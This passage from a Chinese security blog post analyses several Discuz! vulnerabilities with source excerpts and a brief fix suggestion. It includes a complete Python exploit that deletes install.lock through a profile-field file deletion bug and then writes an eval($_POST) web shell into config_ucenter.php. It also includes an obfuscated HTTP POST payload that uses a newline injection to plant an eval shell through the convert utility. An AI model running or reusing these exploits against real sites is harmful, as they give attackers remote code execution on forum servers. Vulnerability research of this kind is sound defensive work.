+<p>然后<code>save_uc_config</code>也没做任何安全处理，就拼接参数后写入文件：</p>
+<pre><code class="php">function save_uc_config($config, $file) &#123;
+
+    $success = false;
+
+    list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config;
+
+    $link = function_exists(&#39;mysql_connect&#39;) ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname);
+    $uc_connnect = $link ? &#39;mysql&#39; : &#39;&#39;;
+
+    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
+    $year = date(&#39;Y&#39;);
+    $config = &lt;&lt;&lt;EOT
+&lt;?php
+
+
+define(&#39;UC_CONNECT&#39;, &#39;$uc_connnect&#39;);
+
+define(&#39;UC_DBHOST&#39;, &#39;$ucdbhost&#39;);
+define(&#39;UC_DBUSER&#39;, &#39;$ucdbuser&#39;);
+define(&#39;UC_DBPW&#39;, &#39;$ucdbpw&#39;);
+define(&#39;UC_DBNAME&#39;, &#39;$ucdbname&#39;);
+define(&#39;UC_DBCHARSET&#39;, &#39;$ucdbcharset&#39;);
+define(&#39;UC_DBTABLEPRE&#39;, &#39;`$ucdbname`.$uctablepre&#39;);
+define(&#39;UC_DBCONNECT&#39;, 0);
+
+define(&#39;UC_CHARSET&#39;, &#39;$uccharset&#39;);
+define(&#39;UC_KEY&#39;, &#39;$appauthkey&#39;);
+define(&#39;UC_API&#39;, &#39;$ucapi&#39;);
+define(&#39;UC_APPID&#39;, &#39;$appid&#39;);
+define(&#39;UC_IP&#39;, &#39;$ucip&#39;);
+define(&#39;UC_PPP&#39;, 20);
+?&gt;
+EOT;
+
+    if($fp = fopen($file, &#39;w&#39;)) &#123;
+        fwrite($fp, $config);
+        fclose($fp);
+        $success = true;
+    &#125;
+    return $success;
+&#125;</code></pre>
+<p>因为 <code>dbhost, dbuser </code>等参数需要用来连接数据库，所以利用 <code>tablepre</code> 向配置文件写入shell。</p>
+<h3 id="5、Exp-1"><a href="#5、Exp-1" class="headerlink" title="5、Exp"></a>5、Exp</h3><blockquote>
+<p><a href="https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b" target="_blank" rel="noopener">https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b</a></p>
+</blockquote>
+<pre><code class="python">#!/usr/bin/env python3
+import base64
+import random
+import re
+import string
+
+import requests
+
+sess = requests.Session()
+randstr = lambda len=5: &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(len))
+
+##################################################
+########## Customize these parameters ############
+target = &#39;http://localhost/discuzx&#39;
+# login target site first, and copy the cookie here
+cookie = &quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode&quot;
+shell_password = randstr()
+db_host = &#39;&#39;
+db_user = &#39;&#39;
+db_pw = &#39;&#39;
+db_name = &#39;&#39;
+#################################################
+
+path = &#39;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#39;
+url = target + path
+
+sess.headers.update(&#123;
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#39;,
+    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,
+    &#39;Referer&#39;: url&#125;)
+
+
+# sess.proxies.update(&#123;&#39;http&#39;: &#39;socks5://localhost:1080&#39;&#125;)
+# sess.proxies.update(&#123;&#39;http&#39;: &#39;http://localhost:8080&#39;&#125;)
+
+
+def login(username=None, password=None):
+    sess.headers.update(&#123;&#39;Cookie&#39;: cookie&#125;)
+
+
+def get_form_hash():
+    r = sess.get(url)
+    match = re.search(r&#39;&quot;member.php\?mod=logging&amp;amp;action=logout&amp;amp;formhash=(.*?)&quot;&#39;, r.text, re.I)
+    if match:
+        return match.group(1)
+
+
+def tamper(formhash, file_to_delete):
+    data = &#123;
+        &#39;formhash&#39;: (None, formhash),
+        &#39;profilesubmit&#39;: (None, &#39;true&#39;),
+        &#39;birthprovince&#39;: (None, file_to_delete)
+    &#125;
+    r = sess.post(url, files=data)
+    if &#39;parent.show_success&#39; in r.text:
+        print(&#39;tamperred successfully&#39;)
+        return True
+
+
+def delete(formhash, file):
+    if not tamper(formhash, file):
+        return False
+
+    image = b&#39;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#39;
+    data = &#123;
+        &#39;formhash&#39;: formhash,
+        &#39;profilesubmit&#39;: &#39;true&#39;
+    &#125;
+    files = &#123;
+        &#39;birthprovince&#39;: (&#39;image.png&#39;, base64.b64decode(image), &#39;image/png&#39;)
+    &#125;
+    r = sess.post(url, data=data, files=files)
+    if &#39;parent.show_success&#39; in r.text:
+        print(&#39;delete &#123;&#125; successfully&#39;.format(file))
+        return True
+
+
+def getshell():
+    install_url = target + &#39;/install/index.php&#39;
+    r = sess.get(install_url)
+    if &#39;安装向导&#39; not in r.text:
+        print(&#39;install directory not exists&#39;)
+        return False
+
+    table_prefix = &quot;x&#39;);@eval($_POST[&#123;&#125;]);(&#39;&quot;.format(shell_password)
+    data = &#123;
+        &#39;step&#39;: 3,
+        &#39;install_ucenter&#39;: &#39;yes&#39;,
+        &#39;dbinfo[dbhost]&#39;: db_host,
+        &#39;dbinfo[dbname]&#39;: db_name,
+        &#39;dbinfo[dbuser]&#39;: db_user,
+        &#39;dbinfo[dbpw]&#39;: db_pw,
+        &#39;dbinfo[tablepre]&#39;: table_prefix,
+        &#39;dbinfo[adminemail]&#39;: &#39;admin@admin.com&#39;,
+        &#39;admininfo[username]&#39;: &#39;admin&#39;,
+        &#39;admininfo[password]&#39;: &#39;admin&#39;,
+        &#39;admininfo[password2]&#39;: &#39;admin&#39;,
+        &#39;admininfo[email]&#39;: &#39;admin@admin.com&#39;,
+    &#125;
+    r = sess.post(install_url, data=data)
+    if &#39;建立数据表 CREATE TABLE&#39; not in r.text:
+        print(&#39;write shell failed&#39;)
+        return False
+    print(&#39;shell: &#123;&#125;/config/config_ucenter.php&#39;.format(target))
+    print(&#39;password: &#123;&#125;&#39;.format(shell_password))
+
+
+if __name__ == &#39;__main__&#39;:
+    login()
+    form_hash = get_form_hash()
+    if form_hash:
+        delete(form_hash, &#39;../../../data/install.lock&#39;)
+        getshell()
+    else:
+        print(&#39;failed&#39;)</code></pre>
+<h2 id="Dz全版本，版本转换功能导致Getshell"><a href="#Dz全版本，版本转换功能导致Getshell" class="headerlink" title="Dz全版本，版本转换功能导致Getshell"></a>Dz全版本，版本转换功能导致Getshell</h2><h3 id="1、简述-3"><a href="#1、简述-3" class="headerlink" title="1、简述"></a>1、简述</h3><p>存在问题的代码在<code>/utility/convert/</code>目录下，这部分的功能主要是用于Dz系列产品升级/转换。</p>
+<p><strong>影响范围：</strong>全版本</p>
+<p><strong>条件：</strong>存在<code>/utility/convert/</code>目录和相应功能。</p>
+<h3 id="2、复现环境-3"><a href="#2、复现环境-3" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上，目前gitee最新版代码依然存在该漏洞。</p>
+<h3 id="3、漏洞复现-3"><a href="#3、漏洞复现-3" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>在产品升级/转换-&gt;选择产品转换程序 -&gt;设置服务器信息 这里抓包，</p>
+<p>payload：</p>
+<pre><code>POST /dz/utility/convert/index.php HTTP/1.1
+Host: 127.0.0.1:8001
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 278
+Origin: http://127.0.0.1:8001
+Connection: close
+Referer: http://127.0.0.1:8001/dz/utility/convert/index.php
+Upgrade-Insecure-Requests: 1
+
+a=config&amp;source=d7.2_x1.5&amp;submit=yes&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa</code></pre>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_utility/4_1.png"></p>
+<h3 id="4、漏洞分析-3"><a href="#4、漏洞分析-3" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>入口<code>utility/convert/index.php</code></p>
+<pre><code class="php">require &#39;./include/common.inc.php&#39;;
+
+$action = getgpc(&#39;a&#39;);
+$action = empty($action) ? getgpc(&#39;action&#39;) : $action;
+$source = getgpc(&#39;source&#39;) ? getgpc(&#39;source&#39;) : getgpc(&#39;s&#39;);</code></pre>
+<p> 取<code>$_POST[&#39;a&#39;]</code>,直接赋值给<code>$action </code>，此时<code>$action = config</code>;</p>
+<pre><code class="php">&#125; elseif($action == &#39;config&#39; || CONFIG_EMPTY) &#123;      
+    require DISCUZ_ROOT.&#39;./include/do_config.inc.php&#39;;  
+&#125; elseif($action == &#39;setting&#39;) &#123;</code></pre>
+<p>满足条件，引入<code>./include/do_config.inc.php</code></p>
+<pre><code class="php">@touch($configfile);
+ ......
+if(submitcheck()) &#123;
+    $newconfig = getgpc(&#39;newconfig&#39;);
+    if(is_array($newconfig)) &#123;
+        $checkarray = $setting[&#39;config&#39;][&#39;ucenter&#39;] ? array(&#39;source&#39;, &#39;target&#39;, &#39;ucenter&#39;) : array(&#39;source&#39;, &#39;target&#39;);
+        foreach ($checkarray as $key) &#123;
+      ......
+    &#125;
+    save_config_file($configfile, $newconfig, $config_default);</code></pre>
+<p><code>$newconfig</code>从<code>$_POST[newconfig]</code>获取数据，<code>save_config_file</code>函数保将<code>$newconfig</code>保存到<code>$configfile</code>文件中，即<code>config.inc.php</code>文件。跟进该函数。</p>
+<pre><code class="php">function save_config_file($filename, $config, $default) &#123;
+    $config = setdefault($config, $default);// 将$config中的空白项用 $default 中对应项的值填充
+    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
+    $year = date(&#39;Y&#39;);
+    $content = &lt;&lt;&lt;EOT
+&lt;?php
+
+
+\$_config = array();
+
+EOT;
+    $content .= getvars(array(&#39;_config&#39; =&gt; $config));
+    $content .= &quot;\r\n// &quot;.str_pad(&#39;  THE END  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH).&quot; //\r\n\r\n?&gt;&quot;;
+    file_put_contents($filename, $content);
+&#125;</code></pre>
+<p>getvars函数处理，此时的<code>$config</code> = <code>$newconfig+config.default.php对应项的补充</code>。看一下getvars函数：</p>
+<pre><code class="php">function getvars($data, $type = &#39;VAR&#39;) &#123;
+    $evaluate = &#39;&#39;;
+    foreach($data as $key =&gt; $val) &#123;
+        if(!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $key)) &#123;
+            continue;
+        &#125;
+        if(is_array($val)) &#123;
+            $evaluate .= buildarray($val, 0, &quot;\$&#123;$key&#125;&quot;).&quot;\r\n&quot;;
+        &#125; else &#123;
+            $val = addcslashes($val, &#39;\&#39;\\&#39;);
+            $evaluate .= $type == &#39;VAR&#39; ? &quot;\$$key = &#39;$val&#39;;\n&quot; : &quot;define(&#39;&quot;.strtoupper($key).&quot;&#39;, &#39;$val&#39;);\n&quot;;
+        &#125;
+    &#125;
+    return $evaluate;
+&#125;</code></pre>
+<p>满足if条件会执行<code>buildarray</code>函数，此时<code>$key=_config</code>，<code>$val</code>=上面的<code>$config</code>。最终造成写入的在该函数中（update.php 2206行）：</p>
+<pre><code class="php">    foreach ($array as $key =&gt; $val) &#123;
+        if($level == 0) &#123;
+            //str_pad — 使用另一个字符串填充字符串为指定长度
+            // 第一个参数是要输出的字符串，指定长度为50，用&#39;-&#39;填充，居中
+            $newline = str_pad(&#39;  CONFIG &#39;.strtoupper($key).&#39;  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH);
+            $return .= &quot;\r\n// $newline //\r\n&quot;;
+        &#125;</code></pre>
+<p>本意是使用<code>$config</code>数组的key作为每一块配置区域的”注释标题”，写入配置文件的$newline依赖于$key，而$key是攻击者可控的。</p>
+<p>未对输入数据进行正确的边界处理，导致可以插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码。</p>
+<h3 id="5、修复建议"><a href="#5、修复建议" class="headerlink" title="5、修复建议"></a>5、修复建议</h3><p>update.php 2206行</p>
+<pre><code class="php">  foreach ($array as $key =&gt; $val)&#123; 
+    //过滤掉$key中的非字母、数字及下划线字符</code></pre>
+<h2 id="全版本后台Sql注入"><a href="#全版本后台Sql注入" class="headerlink" title="全版本后台Sql注入"></a>全版本后台Sql注入</h2><h3 id="1、简述-4"><a href="#1、简述-4" class="headerlink" title="1、简述"></a>1、简述</h3><p>Discuz! X系列全版本 截止到 Discuz! X3.4 R20191201 UTF-8</p>
+<p><strong>二次注入</strong></p>
+<p>利用条件有限，还是挺鸡肋的。</p>
+<h3 id="2、复现环境-4"><a href="#2、复现环境-4" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上</p>
+<h3 id="3、漏洞复现-4"><a href="#3、漏洞复现-4" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_3.png"></p>
+<p>报错注入：</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_1.png"></p>
+<p>写文件：</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_2.png"></p>
+<h3 id="4、漏洞分析-4"><a href="#4、漏洞分析-4" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>漏洞原因：经过addslashes存入文件中,从文件中取出字符,转义符号丢失，造成二次注入</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_4.png"></p>
+<p>由前几个的分析已经明白了dz的路由形式，此处的路由解析如下：<code>?action=xxx =&gt; ../admincp_xxx.php</code></p>
+<p>跟进<code>source/admincp/admincp_setting.php</code>，2566行，接收参数修改<code>UC_APPID</code>值。</p>
+<pre><code class="php">        $configfile = str_replace(&quot;define(&#39;UC_APPID&#39;, &#39;&quot;.addslashes(UC_APPID).&quot;&#39;)&quot;, &quot;define(&#39;UC_APPID&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;appid&#39;].&quot;&#39;)&quot;, $configfile);
+
+        $fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;);
+        if(!($fp = @fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;))) &#123;
+            cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);
+        &#125;
+        @fwrite($fp, trim($configfile));
+        @fclose($fp);</code></pre>
+<p>成功写入恶意<code>UC_APPID</code>后，执行更新读取新的配置信息，3415行：</p>
+<pre><code class="php">    if($updatecache) &#123;
+
+        updatecache(&#39;setting&#39;);</code></pre>
+<p>最后在<code>uc_client/model/base.php</code>的<code>note_exists</code>方法中触发注入</p>
+<pre><code class="php">    function note_exists() &#123;
+        $noteexists = $this-&gt;db-&gt;result_first(&quot;SELECT value FROM &quot;.UC_DBTABLEPRE.&quot;vars WHERE name=&#39;noteexists&quot;.UC_APPID.&quot;&#39;&quot;);
+        if(empty($noteexists)) &#123;
+            return FALSE;
+        &#125; else &#123;
+            return TRUE;
+        &#125;
+    &#125;</code></pre>
+<h2 id="Discuz-ML-V3-X-代码注入漏洞"><a href="#Discuz-ML-V3-X-代码注入漏洞" class="headerlink" title="Discuz ML! V3.X 代码注入漏洞"></a>Discuz ML! V3.X 代码注入漏洞</h2><h3 id="1、简述-5"><a href="#1、简述-5" class="headerlink" title="1、简述"></a>1、简述</h3><p><strong>漏洞编号：</strong>CVE-2019-13956</p>
+<p><strong>成因：</strong>漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的，cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，而缓存文件随后又被加载，从而造成代码执行</p>
+<h3 id="2、复现环境-5"><a href="#2、复现环境-5" class="headerlink" title="2、复现环境"></a>2、复现环境</h3>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2020/03/23/dz-xi-lie-lou-dong/">https://lanvnal.com/2020/03/23/dz-xi-lie-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/03/31/tong-da-oa-ren-yi-wen-jian-shang-chuan-wen-jian-bao-han/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/3.jpg" class="responsive-img" alt="通达OA任意文件上传&amp;文件包含">
+                        
+                        <span class="card-title">通达OA任意文件上传&amp;文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/15/ofcms-cve-2019-9615-fu-xian/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/OFCMS-s.png" class="responsive-img" alt="OFCMS代码审计--CVE-2019-9615复现">
+                        
+                        <span class="card-title">OFCMS代码审计--CVE-2019-9615复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
